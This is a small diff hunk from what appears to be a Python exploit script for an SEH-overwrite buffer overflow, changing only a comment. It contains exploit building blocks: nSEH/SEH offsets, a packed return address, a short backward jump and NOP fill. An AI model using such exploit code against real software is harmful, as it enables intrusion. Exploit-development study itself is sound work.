@@ -32,7 +32,7 @@ def main():
     # nseh offset is 3495
     # seh offset is 3499
     seh = struct.pack("<I",0x625011b3)
-    # not enough space for egghunter following shellcode, jump back into buffer
+    # not enough space for egghunter following SEH, jump back into buffer
     nseh = b"\xeb\xc4\x90\x90"
     # line up buffer
     fill = b"\x90" * 1000
